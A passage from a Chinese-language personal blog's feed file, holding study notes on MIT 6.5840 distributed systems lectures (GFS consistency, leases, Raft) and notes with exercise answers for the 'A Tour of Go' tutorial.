storage</li></ul></blockquote><hr><p>计划：storage gfs consistency</p><p>Ideal consistency: behave as if single system<br>有两种风险: concurrency 和 fault</p><p>GFS: performance -&gt; replication + FT -&gt;  consistency<br>GFS依然在2方面不规范：1、只有一个master，无法复制（包含单点故障）；2、in-consistencies，不具备强一致性，容错、复制、性能、一致性之间的斗争至今仍存在</p><p>GFS 的关键属性：</p><ul><li>Big: large data set，比如MapReduce的数据集可能是整个万维网</li><li>Fast: the way is to do automatic sharding</li><li>Global: all apps see the same fs</li><li>Fault tolerant: 并不会完全自动容错，但在提高容错能力方面做的相当好</li></ul><p>master的状态维护：</p><ul><li>file name -&gt; array of chunk handles<br>放在stable storage中：如果master crash，重启后从日志中重建</li><li>chunk handle -&gt; version# &amp;&amp; list of chunk servers (primary, ?secondaries?) 每个主服务器有一个释放时间<br>除了version外可放进内存中<br>version需要放进stable storage中，它需要知道chunk server的块是否是旧的。为什么不能是master向所有chunk server去要信息，然后找到最大版本号的那个作为最新块：有可能崩溃丢失的块才是最新块</li><li>log + checkpoints<br>每当名称空间发生更改时，需要把log写入stable storage<br>在回应客户端之前，改变使master首先写入稳定存储器，然后对客户端回应<br>master的checkpoints也需要写入stable storage</li></ul><p>Write a file: append<br>filename -&gt; chunk handles<br>handles-&gt;servers:</p><ul><li>increase #ver<br>master和chunk servers都把版本号放在stabel storage上</li><li>primiary + secondary</li><li>lease</li></ul><p>append时，检查#ver是否有效 + lease是否有效<br>如果primary向secondary B写入失败时，会重写，重写时使用不同的offset</p><p>GFS只在google内部使用，所有节点都（认为）是可信的</p><p>版本号由coordinator维护，并且仅在选取新的coordinator时才会增加<br>序列号和版本号不同</p><p>当考虑consistency时，需要考虑所有可能的失败，并讨论这些失败是否会导致不一致</p><p>如果master向primary发送心跳包得不到回应，也只能等到lease到期时才能选取新的primary，否则可能会有2个primary</p><p>split brain syndrome 脑裂：产生两个primary<br>解决的方法就是使用lease，只有当lease expired时才选取新的primary</p><p>获得更强的一致性：Update all P + s or none<br>GFS是针对MapReduce定制的？</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> MIT6.5840 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式系统 </tag>
            
            <tag> MIT6.5840讲义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.5840 2023 Lecture 5 Raft (1)</title>
      <link href="/2023/10/09/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lec-5-Raft1/"/>
      <url>/2023/10/09/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lec-5-Raft1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>课程网址：<a href="https://pdos.csail.mit.edu/6.824/schedule.html">https://pdos.csail.mit.edu/6.824/schedule.html</a><br>以下内容来自课程课件，由于课件纯文本显示效果不佳，故对其排版整理并添加了部分个人笔记批注。</p></blockquote><p>Raft是分布式复制协议的核心组件之一，实现完全自动化和容错都必须的</p><p>前面介绍过的复制系统，都存在单点故障问题(single point of failure)</p><ul><li>mapreduce中的cordinator</li><li>GFS的master</li><li>VM-FT的test-and-set存储服务器storag</li></ul><ul><li>诸如Raft一类的协议用于解决<strong>单点故障</strong>问题，同时也用于解决<strong>网络分区</strong>问题。这类解决方案的基本思想即：<strong>大多数原则(majority rule)</strong></li><li>可以据此构建容错服务，也可以处理网络分区，并在服务器故障中表现出很强的一致性<br>另一个考虑大多数的方式是，即使发生网络分区，也只会有一个拥有多数的分区，只有拥有多数的分区才能继续进行</li></ul><ul><li>人们都是用raft来构建一个复制状态机</li><li>操作提交对追随者来说是透明的</li><li>term id唯一地表示 领导者附加日志条目，一个任期内只有一个领导者</li><li>不会有两个日志条目具有相同的idx，相同的任期和不同的命令，因为在特定期内只会有一个领导者，领导者只会使用追加（append）操作。</li><li>为了确保follower记得投票给了哪位候选人，并永远不会改变注意，follower必须把投票结果记录到stable storage中</li><li>必须要按照figure2说明来做，但是它也有些细节缺失，比如如何回应rpc</li></ul><p><img src="/2023/10/09/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lec-5-Raft1/image-20231013090038677.png" alt="image-20231013090038677"></p><p>d一定是term7的leader</p><p>而在term8中，当a需要投票时，d仅仅只是投拒绝，而不能强制组织a称为leader</p><p><a href="https://thesquareplanet.com/blog/students-guide-to-raft/">https://thesquareplanet.com/blog/students-guide-to-raft/</a></p><p><a href="https://thesquareplanet.com/blog/raft-qa/">https://thesquareplanet.com/blog/raft-qa/</a></p><p><a href="https://blog.josejg.com/debugging-pretty/">https://blog.josejg.com/debugging-pretty/</a></p><p>nextIndex是乐观的，使用nextIndex而非一次发送所有日志就是为了减少带宽</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> MIT6.5840 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式系统 </tag>
            
            <tag> MIT6.5840讲义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A Tour of Go 笔记与练习答案</title>
      <link href="/2023/09/30/Go-A-Tour-of-Go/"/>
      <url>/2023/09/30/Go-A-Tour-of-Go/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文主要为《<a href="https://go.dev/tour/list">A Tour of Go</a>》的笔记和练习题答案<br>建议读者直接阅读上面网站中的教程，建议阅读英文版（中文版有内容确实）<br>参考答案可通过导航栏快速跳转查阅</p></blockquote><h1 id="Packages-variables-and-functions"><a href="https://go.dev/tour/basics">Packages, variables, and functions.</a></h1><ul><li><p>In Go, a name is exported if it begins with a capital letter. For example, <code>Pizza</code> is an exported name, as is <code>Pi</code>, which is exported from the <code>math</code> package.</p></li><li><p>Go’s return values may be named. If so, they are treated as variables defined at the top of the function.<br>A <code>return</code> statement without arguments returns the named return values. This is known as a “naked” return.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Naked return statements should be used only in short functions</span></span><br><span class="line"><span class="comment">// They can harm readability in longer functions.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">split</span><span class="params">(sum <span class="type">int</span>)</span></span> (x, y <span class="type">int</span>) &#123;</span><br><span class="line">x = sum * <span class="number">4</span> / <span class="number">9</span></span><br><span class="line">y = sum - x</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>If an initializer is present, the type can be omitted; the variable will take the type of the initializer. e.g. <code>var c, python, java = true, false, &quot;no!&quot;</code></p></li><li><p>Variables declared without an explicit initial value are given their <em>zero value</em>.</p><p>The zero value is:</p><ul><li><code>0</code> for numeric types,</li><li><code>false</code> for the boolean type, and</li><li><code>&quot;&quot;</code> (the empty string) for strings.</li></ul></li><li><p>Numeric constants are high-precision <em>values</em>.<br>An untyped constant takes the type needed by its context.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line"><span class="comment">// Create a huge number by shifting a 1 bit left 100 places.</span></span><br><span class="line"><span class="comment">// In other words, the binary number that is 1 followed by 100 zeroes.</span></span><br><span class="line">Big = <span class="number">1</span> &lt;&lt; <span class="number">100</span></span><br><span class="line"><span class="comment">// Shift it right again 99 places, so we end up with 1&lt;&lt;1, or 2.</span></span><br><span class="line">Small = Big &gt;&gt; <span class="number">99</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">needInt</span><span class="params">(x <span class="type">int</span>)</span></span> <span class="type">int</span> &#123; <span class="keyword">return</span> x*<span class="number">10</span> + <span class="number">1</span> &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">needFloat</span><span class="params">(x <span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x * <span class="number">0.1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(needInt(Small))</span><br><span class="line"><span class="comment">// fmt.Println(needInt(Big)))  // cannot use Big (untyped int constant 1267650600228229401496703205376) as int value in argument to needInt (overflows)</span></span><br><span class="line">fmt.Println(needFloat(Small))</span><br><span class="line">fmt.Println(needFloat(Big))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="Flow-control-statements-for-if-else-switch-and-defer"><a href="https://go.dev/tour/flowcontrol">Flow control statements: for, if, else, switch and defer</a></h1><ul><li>Unlike other languages like C, Java, or JavaScript there are no parentheses <code>( )</code> surrounding the three components of the <code>for</code> statement and the braces <code>&#123; &#125;</code> are always required.</li><li>At that point you can drop the semicolons: C’s <code>while</code> is spelled <code>for</code> in Go.</li><li>Like <code>for</code>, the <code>if</code> statement can start with a short statement to execute before the condition. <code>if v := math.Pow(x, n); v &lt; lim &#123;return v&#125;</code></li></ul><h2 id="Exercise-Loops-and-Functions"><a href="https://go.dev/tour/flowcontrol/8"><strong>Exercise: Loops and Functions</strong></a></h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sqrt</span><span class="params">(x <span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line">z := <span class="number">1.0</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i ++ &#123;</span><br><span class="line">z -= (z*z - x) / (<span class="number">2</span> * z)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> z</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><ul><li><p>Switch cases evaluate cases from top to bottom, stopping when a case succeeds.</p><blockquote><p>会中途停下这一点和C/C++中完全不一样</p></blockquote></li><li><p>Switch without a condition is the same as <code>switch true</code>.<br>This construct can be a clean way to write long if-then-else chains.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">t := time.Now()</span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line"><span class="keyword">case</span> t.Hour() &lt; <span class="number">12</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;Good morning!&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> t.Hour() &lt; <span class="number">17</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;Good afternoon.&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;Good evening.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>A <code>defer</code> statement defers the execution of a function until the surrounding function returns.<br>The deferred call’s arguments are evaluated immediately, but the function call is not executed until the surrounding function returns.</p></li><li><p>Deferred function calls are pushed onto a stack. When a function returns, its deferred calls are executed in last-in-first-out order.</p></li></ul><h1 id="More-types-structs-slices-and-maps"><a href="https://go.dev/tour/moretypes">More types: structs, slices, and maps.</a></h1><ul><li><p>The type <code>*T</code> is a pointer to a <code>T</code> value. Its zero value is <code>nil</code>.</p><blockquote><p>Go 中指针用<code>*T</code>, 数组用<code>[]T</code>表示</p></blockquote></li><li><p>To access the field <code>X</code> of a struct when we have the struct pointer <code>p</code> we could write <code>(*p).X</code>. However, that notation is cumbersome, so the language permits us instead to write just <code>p.X</code>, without the explicit dereference.</p></li><li><p>You can list just a subset of fields by using the <code>Name:</code> syntax. (And the order of named fields is irrelevant.)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Vertex <span class="keyword">struct</span> &#123;</span><br><span class="line">X, Y <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v2 = Vertex&#123;X: <span class="number">1</span>&#125;  <span class="comment">// Y:0 is implicit</span></span><br></pre></td></tr></table></figure></li><li><p>A <code>slice</code>, is a dynamically-sized, flexible view into the elements of an array. In practice, slices are much more common than arrays.<br>A slice does not store any data, it just describes a section of an underlying array.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">primes := [<span class="number">6</span>]<span class="type">int</span>&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>&#125;</span><br><span class="line"><span class="keyword">var</span> s []<span class="type">int</span> = primes[<span class="number">1</span>:<span class="number">4</span>]</span><br></pre></td></tr></table></figure></li><li><p>Slices can be created with the built-in <code>make</code> function; this is how you create dynamically-sized arrays.</p><p>The <code>make</code> function allocates a zeroed array and returns a slice that refers to that array:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">5</span>)  <span class="comment">// len(a)=5</span></span><br></pre></td></tr></table></figure><p>To specify a capacity, pass a third argument to <code>make</code>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, <span class="number">5</span>) <span class="comment">// len(b)=0, cap(b)=5</span></span><br><span class="line"></span><br><span class="line">b = b[:<span class="built_in">cap</span>(b)] <span class="comment">// len(b)=5, cap(b)=5</span></span><br><span class="line">b = b[<span class="number">1</span>:]      <span class="comment">// len(b)=4, cap(b)=4</span></span><br></pre></td></tr></table></figure><blockquote><p>为啥有时cap会变化，有时不会变化呢?<br>个人感觉好像是[first:last]中设定first时会变化，设定last不会变化</p></blockquote></li><li><p>The zero value of a slice is <code>nil</code>.</p></li><li><p>Slices can contain any type, including other slices.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">board := [][]<span class="type">string</span>&#123;</span><br><span class="line">    []<span class="type">string</span>&#123;<span class="string">&quot;_&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;_&quot;</span>&#125;,</span><br><span class="line">    []<span class="type">string</span>&#123;<span class="string">&quot;_&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;_&quot;</span>&#125;,</span><br><span class="line">    []<span class="type">string</span>&#123;<span class="string">&quot;_&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;_&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>It is common to append new elements to a slice, and so Go provides a built-in <code>append</code> function.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s []<span class="type">int</span></span><br><span class="line">printSlice(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">// append works on nil slices.</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">0</span>)</span><br><span class="line">printSlice(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">// The slice grows as needed.</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">1</span>)</span><br><span class="line">printSlice(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">len=0 cap=0 []</span></span><br><span class="line"><span class="comment">len=1 cap=1 [0]</span></span><br><span class="line"><span class="comment">len=2 cap=2 [0 1]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li><li><p>The <code>range</code> form of the <code>for</code> loop iterates over a slice or map.<br>When ranging over a slice, two values are returned for each iteration. The first is the <strong>index</strong>, and the second is a <strong>copy of the element</strong> at that index.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pow = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> pow &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;2**%d = %d\n&quot;</span>, i, v)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>You can skip the index or value by assigning to <code>_</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for i, _ := range pow</span><br><span class="line">for _, value := range pow</span><br></pre></td></tr></table></figure><p>If you only want the index, you can omit the second variable.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i := range pow</span><br></pre></td></tr></table></figure></li></ul><h2 id="Exercise-Slices"><a href="https://go.dev/tour/moretypes/18">Exercise: Slices</a></h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;golang.org/x/tour/pic&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Pic</span><span class="params">(dx, dy <span class="type">int</span>)</span></span> [][]<span class="type">uint8</span> &#123;</span><br><span class="line">pic := <span class="built_in">make</span>([][]<span class="type">uint8</span>, dy)</span><br><span class="line"><span class="keyword">for</span> y := <span class="number">0</span>; y &lt; dy; y++ &#123;</span><br><span class="line">line := <span class="built_in">make</span>([]<span class="type">uint8</span>, dx)</span><br><span class="line"><span class="keyword">for</span> x := <span class="number">0</span>; x &lt; dx; x++ &#123;</span><br><span class="line">line[x] = <span class="type">uint8</span>(x*y)</span><br><span class="line">&#125;</span><br><span class="line">pic[y] = line</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pic</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">pic.Show(Pic)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><ul><li><p>The zero value of a <code>map</code> is <code>nil</code>. A <code>nil</code> map has no keys, nor can keys be added.</p></li><li><p><strong>Mutating Maps</strong></p><p>Insert or update an element in map <code>m</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m[key] = elem</span><br></pre></td></tr></table></figure><p>Retrieve an element:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elem = m[key]</span><br></pre></td></tr></table></figure><p>Delete an element:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(m, key)</span><br></pre></td></tr></table></figure><p>Test that a key is present with a two-value assignment:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elem, ok = m[key]</span><br></pre></td></tr></table></figure></li><li><p><strong>Mutating Maps</strong></p><p>Insert or update an element in map <code>m</code>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m[key] = elem</span><br></pre></td></tr></table></figure><p>Retrieve an element:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elem = m[key]</span><br></pre></td></tr></table></figure><p>Delete an element:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">delete</span>(m, key)</span><br></pre></td></tr></table></figure><p>Test that a key is present with a two-value assignment:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elem, ok = m[key]</span><br></pre></td></tr></table></figure><p><strong>Note:</strong> If <code>elem</code> or <code>ok</code> have not yet been declared you could use a short declaration form: <code>elem, ok := m[key]</code></p></li></ul><h2 id="Exercise-Maps"><a href="https://go.dev/tour/moretypes/23"><strong>Exercise: Maps</strong></a></h2><p><a href="https://pkg.go.dev/strings#FieldsFunc">func FieldsFunc</a>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FieldsFunc</span><span class="params">(s <span class="type">string</span>, f <span class="keyword">func</span>(<span class="type">rune</span>)</span></span> <span class="type">bool</span>) []<span class="type">string</span></span><br></pre></td></tr></table></figure><p>FieldsFunc splits the string s at each run of Unicode code points c satisfying f© and returns an array of slices of s. If all code points in s satisfy f© or the string is empty, an empty slice is returned.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;golang.org/x/tour/wc&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WordCount</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span> &#123;</span><br><span class="line">hash := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line"><span class="keyword">for</span> _, word := <span class="keyword">range</span> strings.Fields(s) &#123;</span><br><span class="line">hash[word]++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> hash</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">wc.Test(WordCount)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><ul><li><p>Go functions may be closures. A closure is a function value that references variables from outside its body. The function may access and assign to the referenced variables; in this sense the function is “bound” to the variables.<br>For example, the <code>adder</code> function returns a closure. Each closure is bound to its own <code>sum</code> variable.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">adder</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">sum := <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(x <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">sum += x</span><br><span class="line"><span class="keyword">return</span> sum</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">pos, neg := adder(), adder()</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">fmt.Println(</span><br><span class="line">pos(i),</span><br><span class="line">neg(<span class="number">-2</span>*i),</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Exercise-Fibonacci-closure"><strong><a href="https://go.dev/tour/moretypes/26">Exercise: Fibonacci closure</a></strong></h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fibonacci is a function that returns</span></span><br><span class="line"><span class="comment">// a function that returns an int.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibonacci</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">a, b:= <span class="number">0</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">temp := a  <span class="comment">// 注意写法：这里先讲a暂存下来，后面再return</span></span><br><span class="line">a, b = b, a + b</span><br><span class="line"><span class="keyword">return</span> temp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">f := fibonacci()</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">fmt.Println(f())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Methods-and-interfaces"><a href="https://go.dev/tour/methods">Methods and interfaces</a></h1><ul><li><p>A <code>method</code> is a function with a special <em><code>receiver</code></em> argument.<br>The receiver appears in its own argument list between the <code>func</code> keyword and the method name. <code>func (v Vertex) Abs() float64 &#123;...&#125;</code><br>Remember: a method is just a function with a receiver argument. Here’s <code>Abs</code> written as a regular function with no change in functionality. <code>func Abs(v Vertex) float64 &#123;...&#125;</code></p></li><li><p><strong>Functions with a pointer argument must take a pointer.</strong><br><strong>While methods with pointer receivers take either a value or a pointer as the receiver when they are called.</strong></p></li><li><p><strong>Functions that take a value argument must take a value of that specific type</strong><br><strong>While methods with value receivers take either a value or a pointer as the receiver when they are called.</strong></p></li><li><p>There are two reasons to use a pointer receiver.</p><ul><li>The first is so that the method can modify the value that its receiver points to.</li><li>The second is to avoid copying the value on each method call. This can be more efficient if the receiver is a large struct, for example.</li></ul></li><li><p>An <em><code>interface</code> type</em> is defined as a set of method signatures.<br>A value of interface type can hold any value that implements those methods.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 